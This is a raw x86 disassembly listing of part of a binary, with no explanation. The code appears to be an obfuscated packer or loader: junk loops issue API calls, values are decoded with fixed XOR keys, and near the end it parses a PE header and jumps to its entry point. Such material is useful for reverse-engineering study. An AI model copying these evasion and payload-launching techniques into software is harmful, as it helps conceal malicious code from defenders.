  409cd3:	push   0x40d738
  409cd8:	sub    DWORD PTR ds:0x412374,0x2332
  409ce2:	call   DWORD PTR ds:0x40d3c4
  409ce8:	mov    DWORD PTR ds:0x415101,0x11
  409cf2:	cmp    DWORD PTR ds:0x415101,0x0
  409cf9:	je     0x409d41
  409cff:	cmp    DWORD PTR ds:0x415101,0x8
  409d06:	jne    0x409d15
  409d0c:	push   DWORD PTR [ebp-0x20]
  409d0f:	call   DWORD PTR ds:0x40d2a4
  409d15:	cmp    DWORD PTR ds:0x415101,0x9
  409d1c:	jne    0x409d2f
  409d22:	mov    ecx,DWORD PTR ds:0x415101
  409d28:	dec    ecx
  409d29:	mov    DWORD PTR ds:0x415101,ecx
  409d2f:	mov    ecx,DWORD PTR ds:0x415101
  409d35:	dec    ecx
  409d36:	mov    DWORD PTR ds:0x415101,ecx
  409d3c:	jmp    0x409cf2
  409d41:	xor    eax,eax
  409d43:	shl    DWORD PTR [ebp-0x4],1
  409d46:	mov    DWORD PTR ds:0x41abd6,0x12
  409d50:	cmp    DWORD PTR ds:0x41abd6,0x0
  409d57:	je     0x409da1
  409d5d:	cmp    DWORD PTR ds:0x41abd6,0x3
  409d64:	jne    0x409d75
  409d6a:	push   0x41ad52
  409d6f:	call   DWORD PTR ds:0x40d1fc
  409d75:	cmp    DWORD PTR ds:0x41abd6,0x4
  409d7c:	jne    0x409d8f
  409d82:	mov    edx,DWORD PTR ds:0x41abd6
  409d88:	dec    edx
  409d89:	mov    DWORD PTR ds:0x41abd6,edx
  409d8f:	mov    edx,DWORD PTR ds:0x41abd6
  409d95:	dec    edx
  409d96:	mov    DWORD PTR ds:0x41abd6,edx
  409d9c:	jmp    0x409d50
  409da1:	and    DWORD PTR [ebp-0x4],edi
  409da4:	and    ecx,ecx
  409da6:	mov    ecx,DWORD PTR [ebp-0x4]
  409da9:	inc    edx
  409daa:	imul   ecx,ecx,0x7f659e30
  409db0:	mov    DWORD PTR [ebp-0x4],ecx
  409db3:	mov    edx,DWORD PTR ds:0x412364
  409db9:	xor    edx,DWORD PTR ds:0x4245ae
  409dbf:	mov    DWORD PTR ds:0x412364,edx
  409dc5:	or     DWORD PTR [ebp-0x4],esi
  409dc8:	mov    DWORD PTR ds:0x415105,0x4568
  409dd2:	mov    ecx,DWORD PTR [ebp-0x4]
  409dd5:	mov    edx,DWORD PTR ds:0x415115
  409ddb:	mov    edx,DWORD PTR [ebp-0xc]
  409dde:	cmp    ecx,DWORD PTR [edx]
  409de0:	jne    0x40a327
  409de6:	inc    eax
  409de7:	mov    DWORD PTR ds:0x4245ae,0x6f03
  409df1:	cmp    eax,0x4
  409df4:	jb     0x409d43
  409dfa:	xor    eax,eax
  409dfc:	sbb    DWORD PTR ds:0x412360,edx
  409e02:	shl    DWORD PTR [ebp-0x4],1
  409e05:	and    DWORD PTR [ebp-0x4],edi
  409e08:	mov    ecx,DWORD PTR [ebp-0x4]
  409e0b:	and    DWORD PTR ds:0x417e4d,0x0
  409e15:	mov    edx,DWORD PTR ds:0x417e4d
  409e1b:	inc    edx
  409e1c:	mov    DWORD PTR ds:0x417e4d,edx
  409e22:	cmp    DWORD PTR ds:0x417e4d,0xa
  409e29:	jne    0x409e4c
  409e2f:	push   DWORD PTR [ebp-0x20]
  409e32:	push   0x8411
  409e37:	push   0x41ad5b
  409e3c:	push   0x41adfd
  409e41:	push   0x1dc1
  409e46:	call   DWORD PTR ds:0x40d010
  409e4c:	cmp    DWORD PTR ds:0x417e4d,0x9
  409e53:	jne    0x409e68
  409e59:	xor    edx,edx
  409e5b:	or     edx,DWORD PTR ds:0x417e4d
  409e61:	inc    edx
  409e62:	mov    DWORD PTR ds:0x417e4d,edx
  409e68:	cmp    DWORD PTR ds:0x417e4d,0x19
  409e6f:	jb     0x409e15
  409e75:	mov    edx,DWORD PTR ds:0x417eaa
  409e7b:	mov    edx,DWORD PTR [edx]
  409e7d:	xor    DWORD PTR ds:0x41abda,edx
  409e83:	imul   ecx,ecx,0x7f659e30
  409e89:	mov    edx,DWORD PTR ds:0x412374
  409e8f:	sub    DWORD PTR ds:0x415111,edx
  409e95:	mov    DWORD PTR [ebp-0x4],ecx
  409e98:	and    edx,edx
  409e9a:	or     DWORD PTR [ebp-0x4],esi
  409e9d:	mov    ecx,DWORD PTR [ebp-0x4]
  409ea0:	mov    edx,DWORD PTR [ebp-0xc]
  409ea3:	mov    DWORD PTR ds:0x4245ba,0xa9e
  409ead:	cmp    ecx,DWORD PTR [edx]
  409eaf:	jne    0x40a327
  409eb5:	mov    DWORD PTR ds:0x4150fd,0x72ef
  409ebf:	inc    eax
  409ec0:	cmp    eax,0x4
  409ec3:	mov    DWORD PTR ds:0x412370,0x6303
  409ecd:	jb     0x409dfc
  409ed3:	xor    eax,eax
  409ed5:	and    DWORD PTR ds:0x4150fd,0x0
  409edf:	xor    ecx,ecx
  409ee1:	add    ecx,DWORD PTR ds:0x4150fd
  409ee7:	inc    ecx
  409ee8:	mov    DWORD PTR ds:0x4150fd,ecx
  409eee:	cmp    DWORD PTR ds:0x4150fd,0x28
  409ef5:	jne    0x409f04
  409efb:	push   DWORD PTR [ebp-0x24]
  409efe:	call   DWORD PTR ds:0x40d014
  409f04:	cmp    DWORD PTR ds:0x4150fd,0x18
  409f0b:	jb     0x409edf
  409f11:	add    DWORD PTR ds:0x417e59,0x412378
  409f1b:	shl    DWORD PTR [ebp-0x4],1
  409f1e:	and    DWORD PTR [ebp-0x4],edi
  409f21:	and    DWORD PTR ds:0x412360,0x0
  409f2b:	jmp    0x409f3f
  409f30:	xor    edx,edx
  409f32:	or     edx,DWORD PTR ds:0x412360
  409f38:	inc    edx
  409f39:	mov    DWORD PTR ds:0x412360,edx
  409f3f:	cmp    DWORD PTR ds:0x412360,0x11
  409f46:	jae    0x409f85
  409f4c:	cmp    DWORD PTR ds:0x412360,0x1a
  409f53:	jne    0x409f80
  409f59:	push   0x415119
  409f5e:	push   0x8b4a
  409f63:	push   DWORD PTR [ebp-0x24]
  409f66:	push   0x89fe
  409f6b:	push   0x7f12
  409f70:	push   0x7c49
  409f75:	push   0x1205
  409f7a:	call   DWORD PTR ds:0x40d200
  409f80:	jmp    0x409f30
  409f85:	mov    ecx,DWORD PTR [ebp-0x4]
  409f88:	imul   ecx,ecx,0x7f659e30
  409f8e:	mov    DWORD PTR [ebp-0x4],ecx
  409f91:	or     DWORD PTR [ebp-0x4],esi
  409f94:	mov    ecx,DWORD PTR [ebp-0x4]
  409f97:	mov    edx,DWORD PTR [ebp-0xc]
  409f9a:	mov    DWORD PTR ds:0x4245b6,0x2f25
  409fa4:	cmp    ecx,DWORD PTR [edx]
  409fa6:	mov    DWORD PTR ds:0x412358,0x1252
  409fb0:	jne    0x40a327
  409fb6:	inc    eax
  409fb7:	cmp    eax,0x4
  409fba:	mov    DWORD PTR ds:0x4245ca,0x48e
  409fc4:	jb     0x409ed5
  409fca:	mov    DWORD PTR ds:0x417e55,0x10
  409fd4:	cmp    DWORD PTR ds:0x417e55,0x0
  409fdb:	je     0x40a032
  409fe1:	cmp    DWORD PTR ds:0x417e55,0x19
  409fe8:	jne    0x40a00e
  409fee:	push   DWORD PTR [ebp-0x24]
  409ff1:	push   0x4245ca
  409ff6:	push   DWORD PTR [ebp-0x28]
  409ff9:	push   0x41ada3
  409ffe:	push   0x6e83
  40a003:	push   0x54b6
  40a008:	call   DWORD PTR ds:0x40d204
  40a00e:	mov    edx,DWORD PTR ds:0x417e55
  40a014:	dec    edx
  40a015:	mov    DWORD PTR ds:0x417e55,edx
  40a01b:	jmp    0x409fd4
  40a020:	mov    ecx,DWORD PTR ds:0x40eecc
  40a026:	mov    edx,DWORD PTR ds:0x417eba
  40a02c:	sub    ecx,edx
  40a02e:	imul   ecx,DWORD PTR [ecx+edx*1]
  40a032:	xor    eax,eax
  40a034:	shl    DWORD PTR [ebp-0x4],1
  40a037:	and    DWORD PTR [ebp-0x4],edi
  40a03a:	or     ecx,ecx
  40a03c:	mov    ecx,DWORD PTR [ebp-0x4]
  40a03f:	xor    edx,DWORD PTR ds:0x417e51
  40a045:	imul   ecx,ecx,0x7f659e30
  40a04b:	mov    DWORD PTR ds:0x417e49,0x1d
  40a055:	cmp    DWORD PTR ds:0x417e49,0x0
  40a05c:	je     0x40a0b0
  40a062:	cmp    DWORD PTR ds:0x417e49,0x7
  40a069:	jne    0x40a07a
  40a06f:	push   0x45c2
  40a074:	call   DWORD PTR ds:0x40d208
  40a07a:	cmp    DWORD PTR ds:0x417e49,0x8
  40a081:	jne    0x40a094
  40a087:	mov    edx,DWORD PTR ds:0x417e49
  40a08d:	dec    edx
  40a08e:	mov    DWORD PTR ds:0x417e49,edx
  40a094:	mov    edx,DWORD PTR ds:0x417e49
  40a09a:	dec    edx
  40a09b:	mov    DWORD PTR ds:0x417e49,edx
  40a0a1:	jmp    0x40a055
  40a0a6:	adc    DWORD PTR ds:0x417e45,0x449b
  40a0b0:	mov    DWORD PTR [ebp-0x4],ecx
  40a0b3:	or     ecx,edx
  40a0b5:	or     DWORD PTR [ebp-0x4],esi
  40a0b8:	mov    edx,0x1393
  40a0bd:	mov    ecx,DWORD PTR [ebp-0x4]
  40a0c0:	mov    edx,DWORD PTR [ebp-0xc]
  40a0c3:	mov    DWORD PTR ds:0x41abda,0x516c
  40a0cd:	cmp    ecx,DWORD PTR [edx]
  40a0cf:	jne    0x40a327
  40a0d5:	mov    DWORD PTR ds:0x415111,0x4e99
  40a0df:	inc    eax
  40a0e0:	mov    DWORD PTR ds:0x4245c2,0x1c73
  40a0ea:	cmp    eax,0x4
  40a0ed:	jb     0x40a034
  40a0f3:	xor    eax,eax
  40a0f5:	or     DWORD PTR ds:0x41236c,0x38d4
  40a0ff:	shl    DWORD PTR [ebp-0x4],1
  40a102:	and    DWORD PTR [ebp-0x4],edi
  40a105:	and    ecx,DWORD PTR ds:0x417e59
  40a10b:	mov    ecx,DWORD PTR [ebp-0x4]
  40a10e:	adc    DWORD PTR ds:0x4245be,0x729e
  40a118:	imul   ecx,ecx,0x7f659e30
  40a11e:	adc    edx,0x9b0
  40a124:	mov    DWORD PTR [ebp-0x4],ecx
  40a127:	xor    edx,edx
  40a129:	or     edx,DWORD PTR ds:0x417e55
  40a12f:	xor    DWORD PTR ds:0x4245c6,edx
  40a135:	or     DWORD PTR [ebp-0x4],esi
  40a138:	mov    ecx,DWORD PTR [ebp-0x4]
  40a13b:	mov    edx,DWORD PTR [ebp-0xc]
  40a13e:	mov    DWORD PTR ds:0x4245b6,0xce5
  40a148:	cmp    ecx,DWORD PTR [edx]
  40a14a:	jne    0x40a327
  40a150:	mov    DWORD PTR ds:0x41abd6,0x18a3
  40a15a:	inc    eax
  40a15b:	mov    DWORD PTR ds:0x4245ae,0x5769
  40a165:	cmp    eax,0x4
  40a168:	mov    DWORD PTR ds:0x412358,0x5fb5
  40a172:	jb     0x40a0f5
  40a178:	sbb    ecx,DWORD PTR ds:0x417e59
  40a17e:	xor    eax,eax
  40a180:	mov    DWORD PTR ds:0x412360,0x14
  40a18a:	cmp    DWORD PTR ds:0x412360,0x0
  40a191:	je     0x40a1c1
  40a197:	cmp    DWORD PTR ds:0x412360,0x19
  40a19e:	jne    0x40a1af
  40a1a4:	push   0x2f20
  40a1a9:	call   DWORD PTR ds:0x40d018
  40a1af:	mov    edx,DWORD PTR ds:0x412360
  40a1b5:	dec    edx
  40a1b6:	mov    DWORD PTR ds:0x412360,edx
  40a1bc:	jmp    0x40a18a
  40a1c1:	shl    DWORD PTR [ebp-0x4],1
  40a1c4:	mov    DWORD PTR ds:0x41abe2,0x14
  40a1ce:	cmp    DWORD PTR ds:0x41abe2,0x0
  40a1d5:	je     0x40a233
  40a1db:	cmp    DWORD PTR ds:0x41abe2,0x5
  40a1e2:	jne    0x40a203
  40a1e8:	push   0x1b4e
  40a1ed:	push   DWORD PTR [ebp-0x1c]
  40a1f0:	push   0x1704
  40a1f5:	push   0x41abf4
  40a1fa:	push   DWORD PTR [ebp-0x10]
  40a1fd:	call   DWORD PTR ds:0x40d01c
  40a203:	cmp    DWORD PTR ds:0x41abe2,0x6
  40a20a:	jne    0x40a21d
  40a210:	mov    edx,DWORD PTR ds:0x41abe2
  40a216:	dec    edx
  40a217:	mov    DWORD PTR ds:0x41abe2,edx
  40a21d:	xor    edx,edx
  40a21f:	add    edx,DWORD PTR ds:0x41abe2
  40a225:	dec    edx
  40a226:	mov    DWORD PTR ds:0x41abe2,edx
  40a22c:	jmp    0x40a1ce
  40a231:	neg    edx
  40a233:	and    DWORD PTR [ebp-0x4],edi
  40a236:	mov    ecx,DWORD PTR [ebp-0x4]
  40a239:	neg    edx
  40a23b:	imul   ecx,ecx,0x7f659e30
  40a241:	xor    edx,DWORD PTR ds:0x41abd2
  40a247:	mov    DWORD PTR [ebp-0x4],ecx
  40a24a:	adc    DWORD PTR ds:0x4245b6,ebx
  40a250:	or     DWORD PTR [ebp-0x4],esi
  40a253:	mov    edx,0x77ca
  40a258:	mov    ecx,DWORD PTR [ebp-0x4]
  40a25b:	mov    edx,DWORD PTR [ebp-0xc]
  40a25e:	mov    DWORD PTR ds:0x41510d,0x1bcb
  40a268:	cmp    ecx,DWORD PTR [edx]
  40a26a:	mov    DWORD PTR ds:0x412354,0x3513
  40a274:	jne    0x40a327
  40a27a:	inc    eax
  40a27b:	cmp    eax,0x4
  40a27e:	mov    DWORD PTR ds:0x417e49,0x110e
  40a288:	jb     0x40a180
  40a28e:	xor    eax,eax
  40a290:	shl    DWORD PTR [ebp-0x4],1
  40a293:	and    DWORD PTR [ebp-0x4],edi
  40a296:	mov    ecx,DWORD PTR [ebp-0x4]
  40a299:	imul   ecx,ecx,0x7f659e30
  40a29f:	mov    DWORD PTR [ebp-0x4],ecx
  40a2a2:	or     DWORD PTR [ebp-0x4],esi
  40a2a5:	mov    ecx,DWORD PTR [ebp-0x4]
  40a2a8:	mov    edx,DWORD PTR [ebp-0xc]
  40a2ab:	cmp    ecx,DWORD PTR [edx]
  40a2ad:	jne    0x40a327
  40a2b3:	inc    eax
  40a2b4:	cmp    eax,0x4
  40a2b7:	jb     0x40a290
  40a2bd:	inc    ebx
  40a2be:	cmp    ebx,0x10
  40a2c1:	jb     0x409b50
  40a2c7:	mov    ebx,0xf89c8538
  40a2cc:	mov    DWORD PTR [ebp-0xc],ebx
  40a2cf:	mov    DWORD PTR [ebp-0x8],0xf89c853b
  40a2d6:	lea    eax,[ebp-0x1c]
  40a2d9:	mov    DWORD PTR [ebp-0x18],eax
  40a2dc:	lea    eax,[ebp-0x20]
  40a2df:	mov    DWORD PTR [ebp-0x10],eax
  40a2e2:	mov    eax,ds:0x40d5d0
  40a2e7:	mov    eax,DWORD PTR [eax+0x1c8]
  40a2ed:	mov    eax,DWORD PTR [eax]
  40a2ef:	mov    ecx,DWORD PTR [ebp-0x10]
  40a2f2:	mov    esi,0x7510859
  40a2f7:	xor    eax,esi
  40a2f9:	mov    edi,0x32729f
  40a2fe:	add    eax,edi
  40a300:	mov    DWORD PTR [ecx],eax
  40a302:	mov    eax,ds:0x40d854
  40a307:	cmp    eax,0x23d14057
  40a30c:	mov    eax,DWORD PTR [ebp-0x8]
  40a30f:	je     0x40a32e
  40a315:	mov    ecx,DWORD PTR [ebp-0xc]
  40a318:	xor    eax,esi
  40a31a:	add    eax,edi
  40a31c:	imul   eax,ecx
  40a31f:	mov    DWORD PTR [ebp-0xc],eax
  40a322:	jmp    0x40a371
  40a327:	xor    eax,eax
  40a329:	jmp    0x40a5d0
  40a32e:	xor    eax,esi
  40a330:	add    eax,edi
  40a332:	mov    ds:0x40d6e0,eax
  40a337:	mov    eax,DWORD PTR [ebp-0xc]
  40a33a:	xor    eax,esi
  40a33c:	add    eax,edi
  40a33e:	mov    ds:0x40d854,eax
  40a343:	mov    eax,DWORD PTR [ebp-0x8]
  40a346:	mov    ecx,DWORD PTR ds:0x40d6e0
  40a34c:	xor    eax,esi
  40a34e:	add    eax,edi
  40a350:	cmp    ecx,eax
  40a352:	jne    0x40a371
  40a358:	push   0x40d72c
  40a35d:	call   DWORD PTR ds:0x40d1ec
  40a363:	mov    ecx,DWORD PTR ds:0x40d5d0
  40a369:	mov    ecx,DWORD PTR [ecx+0x198]
  40a36f:	mov    DWORD PTR [ecx],eax
  40a371:	mov    eax,ds:0x40d5d0
  40a376:	mov    eax,DWORD PTR [eax+0x18c]
  40a37c:	mov    eax,DWORD PTR [eax]
  40a37e:	mov    DWORD PTR [ebp-0x24],eax
  40a381:	mov    eax,0xf89c853c
  40a386:	mov    DWORD PTR [ebp-0x28],eax
  40a389:	mov    DWORD PTR [ebp-0x28],eax
  40a38c:	mov    DWORD PTR [ebp-0x28],eax
  40a38f:	mov    DWORD PTR [ebp-0x10],ebx
  40a392:	mov    DWORD PTR [ebp-0x28],eax
  40a395:	mov    DWORD PTR [ebp-0x28],0xf89c8530
  40a39c:	mov    ebx,DWORD PTR [ebp-0xc]
  40a39f:	mov    ecx,DWORD PTR [ebp-0x8]
  40a3a2:	mov    edx,DWORD PTR [ebp-0x8]
  40a3a5:	xor    edx,esi
  40a3a7:	xor    ecx,esi
  40a3a9:	add    ecx,edx
  40a3ab:	mov    edx,DWORD PTR [ebp-0x8]
  40a3ae:	xor    ebx,esi
  40a3b0:	xor    edx,esi
  40a3b2:	add    ebx,edi
  40a3b4:	lea    ecx,[ecx+edx*1+0x9757dd]
  40a3bb:	cmp    ebx,ecx
  40a3bd:	ja     0x40a41e
  40a3c3:	mov    eax,DWORD PTR [ebp-0x8]
  40a3c6:	xor    eax,esi
  40a3c8:	lea    eax,[eax+ebx*1+0x32729f]
  40a3cf:	push   eax
  40a3d0:	mov    eax,DWORD PTR [ebp-0x10]
  40a3d3:	xor    eax,esi
  40a3d5:	lea    eax,[ebp+eax*1+0x3272a7]
  40a3dc:	push   eax
  40a3dd:	mov    eax,ds:0x40d5d0
  40a3e2:	push   DWORD PTR [eax+0x1bc]
  40a3e8:	call   0x40742d
  40a3ed:	mov    eax,DWORD PTR [ebp-0x8]
  40a3f0:	xor    eax,esi
  40a3f2:	lea    ebx,[ebx+eax*1+0x32729f]
  40a3f9:	mov    eax,DWORD PTR [ebp-0x8]
  40a3fc:	mov    ecx,DWORD PTR [ebp-0x8]
  40a3ff:	xor    ecx,esi
  40a401:	xor    eax,esi
  40a403:	add    eax,ecx
  40a405:	mov    ecx,DWORD PTR [ebp-0x8]
  40a408:	xor    ecx,esi
  40a40a:	lea    eax,[eax+ecx*1+0x9757dd]
  40a411:	cmp    ebx,eax
  40a413:	jbe    0x40a3c3
  40a419:	mov    eax,0xf89c853c
  40a41e:	mov    ecx,DWORD PTR [ebp+0xc]
  40a421:	mov    DWORD PTR ds:0x40d454,ecx
  40a427:	mov    ecx,DWORD PTR [ebp+0x10]
  40a42a:	mov    DWORD PTR ds:0x40d6a8,ecx
  40a430:	mov    ecx,DWORD PTR ds:0x40d454
  40a436:	mov    edx,DWORD PTR [ebp-0x18]
  40a439:	sub    ecx,edi
  40a43b:	xor    ecx,esi
  40a43d:	mov    DWORD PTR [edx],ecx
  40a43f:	mov    ecx,DWORD PTR [ebp-0x1c]
  40a442:	cmp    ecx,0xf89c853b
  40a448:	je     0x40a4a5
  40a44e:	mov    ecx,DWORD PTR [ebp-0xc]
  40a451:	mov    edx,DWORD PTR [ebp-0x20]
  40a454:	xor    ecx,esi
  40a456:	add    ecx,edi
  40a458:	cmp    ecx,edx
  40a45a:	je     0x40a4a5
  40a460:	mov    eax,ds:0x40d5d0
  40a465:	mov    eax,DWORD PTR [eax+0x194]
  40a46b:	mov    ecx,DWORD PTR [eax]
  40a46d:	mov    eax,DWORD PTR [ecx+0x3c]
  40a470:	push   DWORD PTR ds:0x40d6a8
  40a476:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  40a47a:	push   DWORD PTR ds:0x40d454
  40a480:	add    eax,ecx
  40a482:	mov    ecx,DWORD PTR ds:0x40d5d0
  40a488:	mov    ecx,DWORD PTR [ecx+0x194]
  40a48e:	push   DWORD PTR [ecx]
  40a490:	call   eax
  40a492:	mov    ecx,DWORD PTR ds:0x40d5d0
  40a498:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40a49e:	mov    DWORD PTR [ecx],eax
  40a4a0:	jmp    0x40a5b5
  40a4a5:	mov    ecx,DWORD PTR [ebp-0xc]
  40a4a8:	mov    edx,DWORD PTR [ebp-0x24]
  40a4ab:	xor    ecx,esi
  40a4ad:	add    ecx,edi
  40a4af:	cmp    ecx,edx
  40a4b1:	jne    0x40a598
  40a4b7:	mov    ecx,DWORD PTR [ebp-0xc]
  40a4ba:	xor    ecx,esi
  40a4bc:	add    ecx,edi
  40a4be:	mov    DWORD PTR ds:0x40d654,ecx
  40a4c4:	mov    ecx,DWORD PTR [ebp-0xc]
  40a4c7:	xor    ecx,esi
  40a4c9:	add    ecx,edi
  40a4cb:	mov    DWORD PTR ds:0x40d64c,ecx
  40a4d1:	mov    ecx,DWORD PTR [ebp-0x8]
  40a4d4:	mov    DWORD PTR [ebp-0x10],ecx
  40a4d7:	mov    ecx,DWORD PTR [ebp-0xc]
  40a4da:	mov    DWORD PTR [ebp+0xc],ecx
  40a4dd:	mov    ecx,DWORD PTR [ebp+0xc]
  40a4e0:	xor    ecx,esi
  40a4e2:	add    ecx,edi
  40a4e4:	mov    DWORD PTR [ebp+0xc],ecx
  40a4e7:	mov    ecx,DWORD PTR ds:0x40d450
  40a4ed:	mov    ecx,DWORD PTR [ecx]
  40a4ef:	mov    DWORD PTR [ebp+0xc],ecx
  40a4f2:	mov    ecx,DWORD PTR ds:0x40d658
  40a4f8:	mov    ecx,DWORD PTR [ecx]
  40a4fa:	mov    DWORD PTR [ebp-0x18],ecx
  40a4fd:	mov    DWORD PTR [ebp+0x10],0xf89c8738
  40a504:	mov    ecx,DWORD PTR [ebp+0x10]
  40a507:	xor    ecx,esi
  40a509:	add    ecx,edi
  40a50b:	mov    DWORD PTR [ebp+0x10],ecx
  40a50e:	mov    ecx,DWORD PTR ds:0x40d5d0
  40a514:	mov    DWORD PTR [ebp+0x10],ecx
  40a517:	mov    ecx,DWORD PTR [ebp+0xc]
  40a51a:	mov    DWORD PTR [ebp+0xc],ecx
  40a51d:	mov    ecx,DWORD PTR [ebp+0xc]
  40a520:	push   0x4
  40a522:	pop    edx
  40a523:	sub    edx,ecx
  40a525:	add    edx,DWORD PTR [ebp-0x18]
  40a528:	mov    DWORD PTR [ebp-0x28],0xf89c85f8
  40a52f:	mov    DWORD PTR [ebp+0x10],edx
  40a532:	mov    DWORD PTR [ebp-0x74],eax
  40a535:	mov    eax,DWORD PTR [ebp+0xc]
  40a538:	mov    DWORD PTR [ebp-0x70],eax
  40a53b:	mov    eax,DWORD PTR [ebp+0x10]
  40a53e:	mov    DWORD PTR [ebp-0x6c],eax
  40a541:	mov    eax,DWORD PTR [ebp-0x28]
  40a544:	xor    eax,esi
  40a546:	add    eax,edi
  40a548:	mov    DWORD PTR [ebp-0x68],eax
  40a54b:	lea    eax,[ebp-0x30]
  40a54e:	mov    DWORD PTR [ebp-0x64],eax
  40a551:	mov    eax,DWORD PTR [ebp-0x74]
  40a554:	xor    eax,esi
  40a556:	add    eax,edi
  40a558:	mov    DWORD PTR [ebp-0x74],eax
  40a55b:	lea    eax,[ebp-0x74]
  40a55e:	push   eax
  40a55f:	mov    eax,DWORD PTR [ebp-0x10]
  40a562:	xor    eax,esi
  40a564:	add    eax,edi
  40a566:	push   eax
  40a567:	mov    eax,ds:0x40d5f0
  40a56c:	push   0x40d546
  40a571:	push   DWORD PTR [eax]
  40a573:	call   0x40ae4d
  40a578:	xor    esi,esi
  40a57a:	mov    eax,DWORD PTR [ebp+0x10]
  40a57d:	sub    eax,esi
  40a57f:	push   eax
  40a580:	mov    eax,DWORD PTR [ebp+0xc]
  40a583:	add    eax,esi
  40a585:	push   eax
  40a586:	call   0x4059cb
  40a58b:	inc    esi
  40a58c:	cmp    esi,0x52
  40a58f:	jb     0x40a57a
  40a595:	mov    eax,DWORD PTR [ebp-0x10]
  40a598:	call   0x404704
  40a59d:	lea    eax,[ebp+0x4]
  40a5a0:	mov    DWORD PTR [ebp-0x2c],eax
  40a5a3:	mov    eax,DWORD PTR [ebp-0x14]
  40a5a6:	mov    eax,DWORD PTR [ebp-0x8]
  40a5a9:	push   DWORD PTR [ebp-0xc]
  40a5ac:	lea    eax,[ebp-0x2c]
  40a5af:	push   eax
  40a5b0:	call   0x407c0a
  40a5b5:	mov    eax,ds:0x40d5d0
  40a5ba:	push   0x4
  40a5bc:	add    eax,0x1cc
  40a5c1:	push   eax
  40a5c2:	lea    eax,[ebp-0x14]
  40a5c5:	push   eax
  40a5c6:	call   0x40742d
  40a5cb:	mov    eax,DWORD PTR [ebp-0x14]
  40a5ce:	mov    eax,DWORD PTR [eax]
  40a5d0:	pop    edi
  40a5d1:	pop    esi
  40a5d2:	pop    ebx
  40a5d3:	leave  
  40a5d4:	ret    0xc
  40a5d7:	push   ebp
  40a5d8:	mov    ebp,esp
  40a5da:	sub    esp,0x14
  40a5dd:	leave  
  40a5de:	ret    0x4
  40a5e1:	push   ebp
  40a5e2:	mov    ebp,esp
  40a5e4:	push   ecx
  40a5e5:	or     eax,0x5cec
  40a5ea:	mov    DWORD PTR [ebp-0x4],0xf89c8538
  40a5f1:	add    eax,0x77b5
  40a5f6:	mov    eax,DWORD PTR [ebp+0x8]
  40a5f9:	mov    al,BYTE PTR [eax]
  40a5fb:	add    DWORD PTR ds:0x412354,0x2449
  40a605:	add    al,0x34
  40a607:	sbb    DWORD PTR ds:0x41237c,0x412364
  40a611:	xor    al,0x4a
  40a613:	cmp    al,0xcb
  40a615:	mov    DWORD PTR ds:0x4245c2,0x6064
  40a61f:	jne    0x40a6b9
  40a625:	mov    eax,DWORD PTR [ebp+0x8]
  40a628:	mov    ecx,DWORD PTR [ebp+0x8]
  40a62b:	add    ecx,DWORD PTR [eax+0x3c]
  40a62e:	mov    edx,0x7510859
  40a633:	and    DWORD PTR ds:0x412368,0x0
  40a63d:	mov    eax,ds:0x412368
  40a642:	inc    eax
  40a643:	mov    ds:0x412368,eax
  40a648:	cmp    DWORD PTR ds:0x412368,0xe
  40a64f:	jne    0x40a663
  40a655:	push   0x41236c
  40a65a:	push   DWORD PTR [ebp-0x10]
  40a65d:	call   DWORD PTR ds:0x40d398
  40a663:	cmp    DWORD PTR ds:0x412368,0xd
  40a66a:	jne    0x40a67b
  40a670:	mov    eax,ds:0x412368
  40a675:	inc    eax
  40a676:	mov    ds:0x412368,eax
  40a67b:	cmp    DWORD PTR ds:0x412368,0x1f
  40a682:	jb     0x40a63d
  40a688:	mov    DWORD PTR [ebp+0x8],ecx
  40a68b:	mov    eax,DWORD PTR [ebp-0x4]
  40a68e:	xor    eax,edx
  40a690:	push   esi
  40a691:	mov    esi,DWORD PTR [ebp+0x8]
  40a694:	mov    ecx,0x32729f
  40a699:	add    eax,ecx
  40a69b:	cmp    DWORD PTR [esi+0x54],eax
  40a69e:	pop    esi
  40a69f:	je     0x40a6ad
  40a6a5:	mov    eax,DWORD PTR [ebp+0x8]
  40a6a8:	jmp    0x40a6c6
  40a6ad:	mov    eax,DWORD PTR [ebp-0x4]
  40a6b0:	xor    eax,edx
  40a6b2:	add    eax,ecx
  40a6b4:	jmp    0x40a6c6
  40a6b9:	mov    eax,DWORD PTR [ebp-0x4]
  40a6bc:	xor    eax,0x7510859
  40a6c1:	add    eax,0x32729f
  40a6c6:	leave  
  40a6c7:	ret    0x4
  40a6ca:	push   ebp
  40a6cb:	mov    ebp,esp
  40a6cd:	push   ecx
  40a6ce:	mov    DWORD PTR ds:0x417e41,0x1a
  40a6d8:	cmp    DWORD PTR ds:0x417e41,0x0
  40a6df:	je     0x40a739
  40a6e5:	cmp    DWORD PTR ds:0x417e41,0x4
  40a6ec:	jne    0x40a70f
  40a6f2:	push   0x6416
  40a6f7:	push   0x57a6
  40a6fc:	push   0x7327
  40a701:	push   DWORD PTR [ebp-0xc]
  40a704:	push   0x1809
  40a709:	call   DWORD PTR ds:0x40d39c
  40a70f:	cmp    DWORD PTR ds:0x417e41,0x5
  40a716:	jne    0x40a727
  40a71c:	mov    eax,ds:0x417e41
  40a721:	dec    eax
  40a722:	mov    ds:0x417e41,eax
  40a727:	mov    eax,ds:0x417e41
  40a72c:	dec    eax
  40a72d:	mov    ds:0x417e41,eax
  40a732:	jmp    0x40a6d8
  40a737:	sub    edx,edx
  40a739:	push   ecx
  40a73a:	sub    edx,eax
  40a73c:	mov    DWORD PTR [ebp-0x8],0xf89c8538
  40a743:	and    DWORD PTR ds:0x412358,0x0
  40a74d:	jmp    0x40a761
  40a752:	xor    edx,edx
  40a754:	add    edx,DWORD PTR ds:0x412358
  40a75a:	inc    edx
  40a75b:	mov    DWORD PTR ds:0x412358,edx
  40a761:	cmp    DWORD PTR ds:0x412358,0x11
  40a768:	jae    0x40a79c
  40a76e:	cmp    DWORD PTR ds:0x412358,0x18
  40a775:	jne    0x40a791
  40a77b:	push   0x4012
  40a780:	push   DWORD PTR [ebp-0xc]
  40a783:	push   0x7b7f
  40a788:	push   DWORD PTR [ebp-0xc]
  40a78b:	call   DWORD PTR ds:0x40d020
  40a791:	jmp    0x40a752
  40a796:	sub    DWORD PTR ds:0x4245ae,ebx
  40a79c:	mov    DWORD PTR [ebp-0x4],0xf89c853b
  40a7a3:	jmp    0x40a91b
  40a7a8:	(bad)  
  40a7a9:	jmp    0x40a73d
  40a7ab:	aam    0x78
  40a7ad:	push   ebp
  40a7ae:	pop    ecx
  40a7af:	jnp    0x40a756
  40a7b1:	fwait
  40a7b2:	jne    0x40a830
